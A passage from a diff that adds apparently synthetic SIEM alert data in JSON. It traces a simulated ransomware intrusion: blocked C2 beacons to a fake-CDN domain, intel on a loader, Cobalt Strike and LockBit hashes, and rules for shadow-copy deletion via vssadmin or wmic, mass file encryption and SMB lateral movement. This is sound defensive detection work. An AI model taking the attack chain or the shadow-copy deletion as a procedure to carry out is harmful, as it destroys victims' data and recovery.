+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000858",
+        "ts": "2026-10-23T09:47:54Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000859",
+        "ts": "2026-10-23T09:48:03Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000860",
+        "ts": "2026-10-23T09:48:12Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000861",
+        "ts": "2026-10-23T09:48:21Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000862",
+        "ts": "2026-10-23T09:48:30Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000863",
+        "ts": "2026-10-23T09:48:39Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000864",
+        "ts": "2026-10-23T09:48:48Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000865",
+        "ts": "2026-10-23T09:48:57Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000866",
+        "ts": "2026-10-23T09:49:06Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000867",
+        "ts": "2026-10-23T09:49:15Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000868",
+        "ts": "2026-10-23T09:49:24Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000869",
+        "ts": "2026-10-23T09:49:33Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      },
+      {
+        "event_id": "EVT-000870",
+        "ts": "2026-10-23T09:49:42Z",
+        "action": "proxy_denied",
+        "message": "POST http://cdn-update-sync.com/beacon -> 403"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "cdn-update-sync.com",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "URLhaus",
+        "first_seen": "2026-10-11",
+        "last_seen": "2026-10-26",
+        "tags": "loader,payload",
+        "description": "Fake CDN used by a PowerShell downloader to stage second-stage payloads"
+      },
+      {
+        "type": "ip",
+        "value": "192.0.2.77",
+        "threat_type": "Command and Control",
+        "confidence": "high",
+        "source": "MISP",
+        "first_seen": "2026-10-12",
+        "last_seen": "2026-10-26",
+        "tags": "c2,cobalt-strike",
+        "description": "Cobalt Strike team server beacon endpoint"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.14"
+      ],
+      "destination_ips": [
+        "192.0.2.77"
+      ],
+      "domains": [
+        "cdn-update-sync.com"
+      ],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Communication with known malicious infrastructure: 65 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:35:00Z and 2026-10-23T11:25:00Z",
+    "alert_id": "ALT-2026-0022",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 6,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-027",
+    "rule_name": "Known malware hash on endpoint",
+    "description": "A file matching a threat-intelligence hash for malware or ransomware was created or executed on an endpoint.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.95,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1204.002",
+        "tactic": "Execution",
+        "technique": "User Execution: Malicious File"
+      }
+    ],
+    "entity": {
+      "host.name": "ws-fin-14.corp.local"
+    },
+    "group_key": "ws-fin-14.corp.local",
+    "first_event_ts": "2026-10-23T09:35:00Z",
+    "last_event_ts": "2026-10-23T09:37:00Z",
+    "detected_at": "2026-10-23T09:37:00Z",
+    "event_count": 3,
+    "event_ids": [
+      "EVT-000826",
+      "EVT-000828",
+      "EVT-000829"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000826",
+        "ts": "2026-10-23T09:35:00Z",
+        "action": "dns_query",
+        "message": "dns query cdn-update-sync.com"
+      },
+      {
+        "event_id": "EVT-000828",
+        "ts": "2026-10-23T09:36:00Z",
+        "action": "file_created",
+        "message": "file created C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe"
+      },
+      {
+        "event_id": "EVT-000829",
+        "ts": "2026-10-23T09:37:00Z",
+        "action": "process_created",
+        "message": "process created invoice_2026.exe"
+      }
+    ],
+    "intel": [
+      {
+        "type": "domain",
+        "value": "cdn-update-sync.com",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "URLhaus",
+        "first_seen": "2026-10-11",
+        "last_seen": "2026-10-26",
+        "tags": "loader,payload",
+        "description": "Fake CDN used by a PowerShell downloader to stage second-stage payloads"
+      },
+      {
+        "type": "sha256",
+        "value": "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f90112233445566778899aabbccddeeff00",
+        "threat_type": "Malware",
+        "confidence": "high",
+        "source": "ThreatConnect",
+        "first_seen": "2026-10-16",
+        "last_seen": "2026-10-26",
+        "tags": "loader,powershell",
+        "description": "Signed-loLBin PowerShell loader used for initial execution"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [
+        "cdn-update-sync.com"
+      ],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "ws-fin-14.corp.local"
+      ],
+      "files": [
+        "C:\\Users\\j.patel\\AppData\\Local\\Temp\\invoice_2026.exe"
+      ]
+    },
+    "summary": "Known malware hash on endpoint: 3 matching event(s) for host.name=ws-fin-14.corp.local between 2026-10-23T09:35:00Z and 2026-10-23T09:37:00Z",
+    "alert_id": "ALT-2026-0017",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-027",
+    "rule_name": "Known malware hash on endpoint",
+    "description": "A file matching a threat-intelligence hash for malware or ransomware was created or executed on an endpoint.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.95,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1204.002",
+        "tactic": "Execution",
+        "technique": "User Execution: Malicious File"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local"
+    },
+    "group_key": "fs01.corp.local",
+    "first_event_ts": "2026-10-24T02:16:00Z",
+    "last_event_ts": "2026-10-24T02:16:00Z",
+    "detected_at": "2026-10-24T02:16:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000937"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000937",
+        "ts": "2026-10-24T02:16:00Z",
+        "action": "file_created",
+        "message": "file created C:\\Windows\\Temp\\svc.exe"
+      }
+    ],
+    "intel": [
+      {
+        "type": "sha256",
+        "value": "8f14e45fceea167a5a36dedd4bea2543c0f4a1d3c3c2d5b8f1a7e9d2c4b6a8f0",
+        "threat_type": "Ransomware",
+        "confidence": "critical",
+        "source": "ThreatConnect",
+        "first_seen": "2026-10-13",
+        "last_seen": "2026-10-26",
+        "tags": "ransomware,lockbit,encryptor",
+        "description": "LockBit-family encryptor observed in the finance sector"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": [
+        "C:\\Windows\\Temp\\svc.exe"
+      ]
+    },
+    "summary": "Known malware hash on endpoint: 1 matching event(s) for host.name=fs01.corp.local between 2026-10-24T02:16:00Z and 2026-10-24T02:16:00Z",
+    "alert_id": "ALT-2026-0026",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 16,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-030",
+    "rule_name": "Shadow copy deletion",
+    "description": "vssadmin, wmic or PowerShell used to delete volume shadow copies, a hallmark of ransomware preparation.",
+    "type": "match",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Ransomware",
+    "playbook": "PB-RANSOMWARE",
+    "mitre": [
+      {
+        "id": "T1490",
+        "tactic": "Impact",
+        "technique": "Inhibit System Recovery"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local"
+    },
+    "group_key": "fs01.corp.local",
+    "first_event_ts": "2026-10-24T02:15:00Z",
+    "last_event_ts": "2026-10-24T02:15:00Z",
+    "detected_at": "2026-10-24T02:15:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-000936"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000936",
+        "ts": "2026-10-24T02:15:00Z",
+        "action": "process_created",
+        "message": "process created cmd.exe"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Shadow copy deletion: 1 matching event(s) for host.name=fs01.corp.local between 2026-10-24T02:15:00Z and 2026-10-24T02:15:00Z",
+    "alert_id": "ALT-2026-0025",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-031",
+    "rule_name": "Mass file encryption",
+    "description": "One hundred or more file write events on a server within ten minutes, consistent with bulk encryption.",
+    "type": "threshold",
+    "base_severity": "Critical",
+    "confidence": 0.85,
+    "incident_type": "Ransomware",
+    "playbook": "PB-RANSOMWARE",
+    "mitre": [
+      {
+        "id": "T1486",
+        "tactic": "Impact",
+        "technique": "Data Encrypted for Impact"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local"
+    },
+    "group_key": "fs01.corp.local",
+    "first_event_ts": "2026-10-24T02:16:00Z",
+    "last_event_ts": "2026-10-24T02:20:54Z",
+    "detected_at": "2026-10-24T02:20:54Z",
+    "event_count": 100,
+    "event_ids": [
+      "EVT-000937",
+      "EVT-000938",
+      "EVT-000939",
+      "EVT-000940",
+      "EVT-000941",
+      "EVT-000942",
+      "EVT-000943",
+      "EVT-000944",
+      "EVT-000945",
+      "EVT-000946",
+      "EVT-000947",
+      "EVT-000948",
+      "EVT-000949",
+      "EVT-000950",
+      "EVT-000951",
+      "EVT-000952",
+      "EVT-000953",
+      "EVT-000954",
+      "EVT-000955",
+      "EVT-000956",
+      "EVT-000957",
+      "EVT-000958",
+      "EVT-000959",
+      "EVT-000960",
+      "EVT-000961",
+      "EVT-000962",
+      "EVT-000963",
+      "EVT-000964",
+      "EVT-000965",
+      "EVT-000966",
+      "EVT-000967",
+      "EVT-000968",
+      "EVT-000969",
+      "EVT-000970",
+      "EVT-000971",
+      "EVT-000972",
+      "EVT-000973",
+      "EVT-000974",
+      "EVT-000975",
+      "EVT-000976",
+      "EVT-000977",
+      "EVT-000978",
+      "EVT-000979",
+      "EVT-000980",
+      "EVT-000981",
+      "EVT-000982",
+      "EVT-000983",
+      "EVT-000984",
+      "EVT-000985",
+      "EVT-000986"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000937",
+        "ts": "2026-10-24T02:16:00Z",
+        "action": "file_created",
+        "message": "file created C:\\Windows\\Temp\\svc.exe"
+      },
+      {
+        "event_id": "EVT-000938",
+        "ts": "2026-10-24T02:16:00Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0000.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000939",
+        "ts": "2026-10-24T02:16:03Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0001.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000940",
+        "ts": "2026-10-24T02:16:06Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0002.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000941",
+        "ts": "2026-10-24T02:16:09Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0003.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000942",
+        "ts": "2026-10-24T02:16:12Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0004.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000943",
+        "ts": "2026-10-24T02:16:15Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0005.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000944",
+        "ts": "2026-10-24T02:16:18Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0006.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000945",
+        "ts": "2026-10-24T02:16:21Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0007.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000946",
+        "ts": "2026-10-24T02:16:24Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0008.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000947",
+        "ts": "2026-10-24T02:16:27Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0009.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000948",
+        "ts": "2026-10-24T02:16:30Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0010.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000949",
+        "ts": "2026-10-24T02:16:33Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0011.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000950",
+        "ts": "2026-10-24T02:16:36Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0012.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000951",
+        "ts": "2026-10-24T02:16:39Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0013.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000952",
+        "ts": "2026-10-24T02:16:42Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0014.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000953",
+        "ts": "2026-10-24T02:16:45Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0015.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000954",
+        "ts": "2026-10-24T02:16:48Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0016.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000955",
+        "ts": "2026-10-24T02:16:51Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0017.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000956",
+        "ts": "2026-10-24T02:16:54Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0018.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000957",
+        "ts": "2026-10-24T02:16:57Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0019.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000958",
+        "ts": "2026-10-24T02:17:00Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0020.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000959",
+        "ts": "2026-10-24T02:17:03Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0021.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000960",
+        "ts": "2026-10-24T02:17:06Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0022.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000961",
+        "ts": "2026-10-24T02:17:09Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0023.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000962",
+        "ts": "2026-10-24T02:17:12Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0024.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000963",
+        "ts": "2026-10-24T02:17:15Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0025.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000964",
+        "ts": "2026-10-24T02:17:18Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0026.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000965",
+        "ts": "2026-10-24T02:17:21Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0027.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000966",
+        "ts": "2026-10-24T02:17:24Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0028.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000967",
+        "ts": "2026-10-24T02:17:27Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0029.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000968",
+        "ts": "2026-10-24T02:17:30Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0030.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000969",
+        "ts": "2026-10-24T02:17:33Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0031.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000970",
+        "ts": "2026-10-24T02:17:36Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0032.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000971",
+        "ts": "2026-10-24T02:17:39Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0033.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000972",
+        "ts": "2026-10-24T02:17:42Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0034.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000973",
+        "ts": "2026-10-24T02:17:45Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0035.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000974",
+        "ts": "2026-10-24T02:17:48Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0036.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000975",
+        "ts": "2026-10-24T02:17:51Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0037.xlsx.locked"
+      },
+      {
+        "event_id": "EVT-000976",
+        "ts": "2026-10-24T02:17:54Z",
+        "action": "file_created",
+        "message": "file created D:\\Finance\\2026\\Q3\\ledger_0038.xlsx.locked"
+      }
+    ],
+    "intel": [
+      {
+        "type": "sha256",
+        "value": "8f14e45fceea167a5a36dedd4bea2543c0f4a1d3c3c2d5b8f1a7e9d2c4b6a8f0",
+        "threat_type": "Ransomware",
+        "confidence": "critical",
+        "source": "ThreatConnect",
+        "first_seen": "2026-10-13",
+        "last_seen": "2026-10-26",
+        "tags": "ransomware,lockbit,encryptor",
+        "description": "LockBit-family encryptor observed in the finance sector"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": [
+        "C:\\Windows\\Temp\\svc.exe",
+        "D:\\Finance\\2026\\Q3\\ledger_0000.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0001.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0002.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0003.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0004.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0005.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0006.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0007.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0008.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0009.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0010.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0011.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0012.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0013.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0014.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0015.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0016.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0017.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0018.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0019.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0020.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0021.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0022.xlsx.locked",
+        "D:\\Finance\\2026\\Q3\\ledger_0023.xlsx.locked"
+      ]
+    },
+    "summary": "Mass file encryption: 100 matching event(s) for host.name=fs01.corp.local between 2026-10-24T02:16:00Z and 2026-10-24T02:20:54Z",
+    "alert_id": "ALT-2026-0027",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 16,
+      "volume_corroboration": 6,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-032",
+    "rule_name": "Suspicious service installation",
+    "description": "A new Windows service was installed with an executable in a staging or temp path.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.8,
+    "incident_type": "Malware",
+    "playbook": "PB-MALWARE",
+    "mitre": [
+      {
+        "id": "T1543.003",
+        "tactic": "Persistence",
+        "technique": "Create or Modify System Process: Windows Service"
+      }
+    ],
+    "entity": {
+      "host.name": "fs01.corp.local"
+    },
+    "group_key": "fs01.corp.local",
+    "first_event_ts": "2026-10-24T02:22:00Z",
+    "last_event_ts": "2026-10-24T02:22:00Z",
+    "detected_at": "2026-10-24T02:22:00Z",
+    "event_count": 1,
+    "event_ids": [
+      "EVT-001058"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001058",
+        "ts": "2026-10-24T02:22:00Z",
+        "action": "service_installed",
+        "message": "A service was installed in the system: WinSecSvc"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "SYSTEM"
+      ],
+      "hosts": [
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Suspicious service installation: 1 matching event(s) for host.name=fs01.corp.local between 2026-10-24T02:22:00Z and 2026-10-24T02:22:00Z",
+    "alert_id": "ALT-2026-0028",
+    "risk_score": 80,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 10,
+      "asset": "fs01.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "fs01.corp.local",
+      "ip": "10.10.0.20",
+      "role": "File Server",
+      "criticality": "Critical",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-033",
+    "rule_name": "SMB lateral movement",
+    "description": "One internal host authenticates with network logons to three or more distinct hosts within ten minutes.",
+    "type": "threshold",
+    "base_severity": "High",
+    "confidence": 0.75,
+    "incident_type": "Lateral Movement",
+    "playbook": "PB-LATERAL-MOVEMENT",
+    "mitre": [
+      {
+        "id": "T1021.002",
+        "tactic": "Lateral Movement",
+        "technique": "Remote Services: SMB/Windows Admin Shares"
+      }
+    ],
+    "entity": {
+      "source.ip": "10.10.2.14"
+    },
+    "group_key": "10.10.2.14",
+    "first_event_ts": "2026-10-24T02:10:00Z",
+    "last_event_ts": "2026-10-24T02:10:00Z",
+    "detected_at": "2026-10-24T02:10:00Z",
+    "event_count": 3,
+    "event_ids": [
+      "EVT-000933",
+      "EVT-000934",
+      "EVT-000935"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000933",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      },
+      {
+        "event_id": "EVT-000934",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      },
+      {
+        "event_id": "EVT-000935",
+        "ts": "2026-10-24T02:10:00Z",
+        "action": "windows_logon_success",
+        "message": "Network logon from finance workstation"
+      }
+    ],
+    "intel": [],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "10.10.2.14"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "j.patel"
+      ],
+      "hosts": [
+        "db01.corp.local",
+        "dc01.corp.local",
+        "fs01.corp.local"
+      ],
+      "files": []
+    },
+    "distinct_count": 3,
+    "distinct_values": [
+      "db01.corp.local",
+      "dc01.corp.local",
+      "fs01.corp.local"
+    ],
+    "summary": "SMB lateral movement: 3 matching event(s) for source.ip=10.10.2.14 between 2026-10-24T02:10:00Z and 2026-10-24T02:10:00Z",
+    "alert_id": "ALT-2026-0023",
+    "risk_score": 80,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 10,
+      "asset": "ws-fin-14.corp.local",
+      "threat_intel": 0,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "ws-fin-14.corp.local",
+      "ip": "10.10.2.14",
+      "role": "Finance Workstation",
+      "criticality": "Critical",
+      "business_unit": "Finance",
+      "environment": "production",
+      "data_classification": "Confidential"
+    },
+    "intel_high_confidence": false
+  },
+  {
+    "rule_id": "DET-034",
+    "rule_name": "Off-hours access to sensitive file share",
+    "description": "Interactive or network logon to a Confidential/Restricted file server outside business hours.",
+    "type": "match",
+    "base_severity": "Medium",
+    "confidence": 0.7,
+    "incident_type": "Insider Threat",
+    "playbook": "PB-INSIDER",
+    "mitre": [
+      {
+        "id": "T1039",
+        "tactic": "Collection",
+        "technique": "Data from Network Shared Drive"
+      },
+      {
+        "id": "T1078",
+        "tactic": "Defense Evasion",
+        "technique": "Valid Accounts"
+      }
+    ],
+    "entity": {
+      "user.name": "j.patel"
+    },
